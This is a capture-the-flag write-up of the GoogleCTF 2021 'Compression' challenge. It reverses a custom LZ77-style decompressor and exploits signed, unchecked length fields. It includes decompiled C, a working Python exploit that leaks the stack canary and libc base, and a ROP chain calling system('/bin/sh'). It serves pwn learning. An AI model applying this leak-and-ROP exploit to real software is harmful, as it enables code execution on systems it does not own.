# [GoogleCTF 21] Compression

# Intro

This was a very satisfying pwn challenge from GoogleCTF 2021.
It is not difficult but I had fun with it, there is some light reversing and playing around involved and the exploit is a fun twist on the usual buffer overflows.

I would definitely recommend this challenge to fellow pwn learners, and for this reason I felt like doing a writeup on it.

# First view

We are given an executable which can compress strings and then decompress the output.
I first checked for obvious buffer overflow and heap bugs with IDA, but the code was not clear enough to tell right away. So I needed to actually reverse the program first.

I do not know any compression algorithms and the code seemed to be a pain to reverse, so first things first, play around with the program to get a feel for it!

To do this I tried a few inputs to try compressing.

### 4000 aa's → 54494e59aaff019f1fff0000

First of all, I wanted to see if the algorithm actually compresses. I inserted the max amount of bytes we are allowed, 4k. aa represents the byte 0xaa.

It clearly does compress. We can see our 0xaa in the middle, and then a bunch of metadata to make the decompression algorithm work.

### aaaa → 54494e59aaaaff0000

This time it did not compress anything, we see our aaa right there in the middle, uncompressed.

54494e59 are the **magic bytes**, excluding them in the decompression phase gives us the error "bad magic".
ff0000 seems to signal the end of the compressed string.

### 6 aa's → 54494e59aaff0105ff0000

This time it's compressing again. If we try with 7 aa's instead, we get 54494e59aaff0106ff0000 (note how the 05 turned into a 06).

### 6 aabb's → 54494e59aabbff020aff0000

After a bit I got the idea of trying with patterns, which was quite important.
It seems to work, although it's not very obvious why those numbers changed that way.

### 6 aabbcc's → 54494e59aabbccff030fff0000

It took me a bit more playing around than this to figure it out, but basically:
That 03 tells us the *pattern length*, while 0f tells us how many more bytes we have to write of that pattern!

It's all speculation before decompiling the executable of course, but playing around like this helped a lot.

### 256 aa's → 54494e59aaff01ff01ff0000

So I wanted to figure out how it would handle lengths greater than a byte. Pattern length remains 01, for bytes to write we have ff01 and I had no idea how to interpret it.

### 0xff bytes?

After all these tests it became clear that 0xff seems to be a special byte. I asked myself, what would happen trying to compress a string with 0xff in it?

Compressing 3 ff's gives us 54494e59ffffffff0000.
However, trying to decompress this string gives us **ERROR: input underflow**.

At this point it's pretty much confirmed that we have to exploit the metadata given to the decompression algorithm.

# Reversing the decompression

I focused on the decompression algorithm since that was the most likely exploit target.

I did a relatively extensive decompilation work for the decompression function and I will post some snippets to show the most important parts.
Full decompiled code will be in the attached files.

## 0xff as special byte

In the decompression loop we find this snippet which confirms that 0xff is a special byte, for all other bytes it just copies them to the output string. There is an overflow check.

```c
nextChInd = chInd + 1;
currCh = input[chInd];
if ( currCh != (char)0xFF )
{
  if ( outInd >= outputDim )
    goto DEST_OVERFLOW;
  output[outInd++] = currCh;
  chInd = nextChInd;
  goto CYCLE_FOOTER;
}
```

## Pattern length / Num. Bytes greater than 256

When current input byte equals 0xff, the algorithm starts parsing the next bytes as the pattern length and num bytes to write.

Basically, it takes only the 7 less significant bits of the byte. If the 8th byte is set to 1, it means the next byte is also part of pattern length (and is not part of num bytes).

Same thing is done with the number of bytes to write.

```c
toShift = 0;
patternLen = 0LL;
do
{
  if ( nextChInd >= inputLen )
    goto INPUT_UNDERFLOW;
  // take only the signed part and shift it
  signedShifted = (unsigned __int64)(input[nextChInd++] & 0x7F) << toShift;
  toShift += 7;
  patternLen |= signedShifted;
}
// keep going if the byte is negative (MSB set to 1)
while ( (char)input[nextChInd - 1] < 0 );
```

They are **signed** variables, which means we can set patternLen / bytesToWrite to be negative.
We can also set them to be too big, there are no controls on this really.

## Pattern repetition

Basically, it makes an iterator of the output array, at the start of the pattern. 
It then starts copying it to the next characters to write to, for bytesToWrite characters.
What's important is that there is **no check** for overflows for this mode of input (unlike in the normal character copy). It took me longer than I'd like to admit to notice this (and it was purely by chance ☹️).

```c
if ( !patternLen )
      break;
if ( bytesToWrite )
{
  outIt = &output[outInd - patternLen];
  do
  {
    v18 = *outIt++;
    outIt[patternLen - 1] = v18;
  }
  while ( outIt != &output[outInd - patternLen + bytesToWrite] );
  outInd += bytesToWrite;
  chInd = nextChInd;
}
else
{
  chInd = nextChInd;
}
CYCLE_FOOTER:
if ( inputLen <= nextChInd )
  goto INPUT_UNDERFLOW; // yes, the print says underflow
```

# The Exploit

A big issue we have to deal with in the exploitation is that the main function is very restrictive, it simply calls the compress or decompress function with your input and then returns.

Our compressed / decompressed strings will all be placed **in the stack**, this is not a heap challenge.

The binary also has **all protections** active. Canary, full relro, NX, pie, and obviously ASLR.

We're pretty much forced to **obtain** **leaks and a second stage (call main again)**, all with a single decompress payload. How?

## The Leaks

The leaks were easier to reason about, so I started doing these. They're also the first thing you need to obtain so that's great.

Basically, we can poison the pattern length metadata so that the decompress goes to search for bytes to copy out of bounds.

We need negative values to leak bytes on higher addresses than the output array.

I implemented this function to help me craft length values: 

```python
def make_length(n):
    i = 0
    out = 0
    while n != 0:
        out |= (n & 0x7f) << (8*i)
        n >>= 7
        # set MSB to 1 if length continues
        if n != 0:
            out |= 0x80 << (8*i)
        i += 1

    numb = out.bit_length()//8 + 1
    b = out.to_bytes(numb, 'little').rstrip(b'\x00')
    return b.hex().encode()
```

Since the variables are signed 64 bit integers, we can craft negative values like this 

```python
# make_length(2**64 - offset)
# payload to leak the canary
canary_leak = b'54494e59ff' + make_length(2**64 - 4104) + make_length(8) + b'ff0000'
# THIS LEAKS MAIN'S RETADDR AND CANARY, IN THAT ORDER
uberleak = b'54494e59ff' + make_length(2**64 - 4104 - 0x30) + make_length(8) + b'ff' + make_length(2**64 - 4104+8) + make_length(8) + b'ff0000'
```

In this example, 4104 is the offset of the canary relative to the output array in the stack.

Note that, to leak multiple values, we have to take into account the amount of bytes we have already written, as the index of the array moves with them.

## Second Stage and Shell

Ok, we can leak things from the stack, but how do we overwrite the ret address while keeping the canary intact? We can use the overflow in the pattern copy snippet.

After writing the leaks to the output array, we can use them as pattern! So we can start copying the values lots of times, until we reach the canary and the ret addr.

I noticed that the stack has a pointer to start(), so we can leak that and then use it as a ret address.

It's all about alignment of the leaks at this point. 
In the second stage we do pretty much the same except we insert our rop as normal bytes and then we start copying it lots of times until we overwrite ret addr.

Remember, we have to use the pattern copy because the normal byte insertion is checked for overflows.

My payload was getting real messy so I implemented a class to help me exploit.

This also allows me to better show the logic in the exploitation: 

```python
# STAGE 1: OBTAINING LEAKS AND CALLING MAIN AGAIN
# alignment for canary to end up on right place after cycle
beginpad = 8*2
middlepad = 0x20
stage1 = DecompressXploiter()
stage1.pad(beginpad)
stage1.leak(canary_offset) # has to end on canary
stage1.pad(middlepad) # between canary and ret addr: 5 words
stage1.leak(mainret_offset)
stage1.leak(start_offset) # has to end on ret addr
stage1.cycle(beginpad, 0x1000)
canary, mainret, start = stage1(io)
libc.address = mainret - 243 - libc.sym.__libc_start_main

# STAGE 2: SYSTEM BINSH ROP
rop = ROP(libc)
rop.call(rop.ret)
rop.call('system', [next(libc.search(b'/bin/sh'))])

beginpad = 8*3
middlepad = 8*5
stage2 = DecompressXploiter()
stage2.pad(beginpad)
stage2.add(p64(canary)) # has to end on canary
stage2.pad(middlepad) # between canary and ret addr: 5 words
stage2.add(rop.chain()) # has to end on ret addr
stage2.cycle(beginpad, 0x1000)
stage2(io) # get shell CTF{lz77_0r1ent3d_pr0gr4mming}
```

# post-flag findings

As the flag tells us, it seems the algorithm is based on lz77.

After getting access to the server we can also read the 'documentation': 

```markdown
# Compression format

(Note to self: the flag is stored in /flag)

1. Header
- u32 MAGIC "TINY"

2. Blocks
- u8 literal
- if literal == 0xff:
  - it's not a literal;
  - varint offset
  - varint length
  - if offset == 0, then special case:
    - if length == 0, EOF
    - if length == 1, literal 0xff
```

So it seems that we can indeed insert literal 0xff, although the compression algorithm maybe does not make use of it? (In the beginning I have shown that the compression with 0xff in it gives errors)

# Xploiter class

I am very proud of it so I will show the code of the class directly in the writeup 😃

```python
class DecompressXploiter():
    def __init__(self):
        self.__magic = b'54494e59'
        self.__payload = b''
        self.__numbytes = 0
        self.__end = b'ff0000'
        self.__leaks = []
        
    def leak(self, offset, num=8):
        length = 2**64-offset if offset > 0 else abs(offset)
        patternlen = make_length(length + self.__numbytes)
        leaklen = make_length(num)

        self.__leaks.append(self.__numbytes)
        self.__numbytes += num
        self.__payload += b'ff' + patternlen + leaklen
        
    def pad(self, num):
        self.__payload += b'aa'*num
        self.__numbytes += num

    def add(self, b):
        assert(b'\xff' not in b)
        self.__payload += b.hex().encode()
        self.__numbytes += len(b)
        
    def chain(self):
        return self.__magic + self.__payload + self.__end
    
    def cycle(self, begin, numb):
        patternlen = make_length(self.__numbytes - begin)
        towrite = make_length(numb)
        self.__payload += b'ff' + patternlen + towrite
        self.__numbytes += numb
        
    def len(self):
        return self.__numbytes
    
    def __call__(self, io):
        io.recvuntil(b'What')
        io.sendline(b'2')
        io.recvuntil(b'Send me the hex')
        io.sendline(self.chain())
        io.recvuntil(b'decompresses to:\n')
        
        leaks = []
        nread = 0
        for offset in self.__leaks:
            io.recvn(offset*2 - nread*2) # hex is 2 digits for 1 byte
            leaks.append(reversed_hex(io.recvn(8*2)))
            nread += offset + 8
            
        return leaks
```